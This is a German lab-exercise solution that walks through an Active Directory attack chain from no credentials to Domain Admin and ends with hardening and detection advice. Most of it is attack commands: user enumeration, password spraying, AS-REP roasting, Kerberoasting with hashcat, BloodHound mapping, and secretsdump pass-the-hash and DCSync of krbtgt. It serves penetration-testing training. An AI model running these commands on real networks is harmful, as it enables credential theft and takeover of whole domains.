# Lösung – Übung 10: Vollständige AD-Attack-Chain

Beispiel-Durchlauf „kein Zugang → Domain Admin". `ad-defense-report-template.md` ist das Gerüst. **Snapshots!**

## 1. Einstieg (ohne Creds)

```bash
kerbrute userenum -d lab.local --dc <DC> users.txt           # gültige User
kerbrute passwordspray -d lab.local --dc <DC> valid.txt 'Frühling2024!'   # erste Creds
# oder AS-REP:
GetNPUsers.py lab.local/ -dc-ip <DC> -usersfile users.txt -no-pass
hashcat -m 18200 asrep.hash rockyou.txt
```

## 2. Mapping

```bash
bloodhound-python -u <user> -p '<pw>' -d lab.local -ns <DC> -c all
# BloodHound GUI: "Shortest Path to Domain Admins"
```

## 3. Eskalation

```bash
GetUserSPNs.py lab.local/<user>:'<pw>' -dc-ip <DC> -request   # Kerberoasting
hashcat -m 13100 kerb.hash rockyou.txt
# oder Relay/Dumping je nach Pfad (Übung 07/08)
secretsdump.py -hashes :<NT> Administrator@<HOST>
```

## 4. Domain Dominance

```bash
secretsdump.py lab.local/da_admin:'<pw>'@<DC> -just-dc-user krbtgt
# optional Golden Ticket (Übung 09)
```

## 5. Report

`ad-defense-report-template.md` ausfüllen: Kette je Schritt (Befehl + Nachweis), MITRE-ATT&CK + Event-IDs, Findings mit Ursache, priorisierte Härtung.

## Härtung (gebündelt)

**Tiering/PAW** (kein DA auf Low-Tier), **Credential Guard**, **gMSA**/starke Service-PW, **LLMNR aus + SMB-Signing**, **MFA**, **LAPS**, Preauth überall, ACL-Hygiene, AES, SIEM-Monitoring (4625/4768/4769/4662), krbtgt-Reset-Prozess.

## Häufige Fehler / Troubleshooting

- **Clock-Skew:** durchgängig Zeit sync (Kerberos).
- **Kette ohne Nachweis/Detection:** je Schritt Befehl + Beleg + Event-ID dokumentieren.
- **Lab nicht zurückgesetzt:** DCSync/Tickets sind invasiv → Snapshots zurück.
- **Nicht linear:** BloodHound-Pfad folgen statt stur alle Angriffe durchzuprobieren.
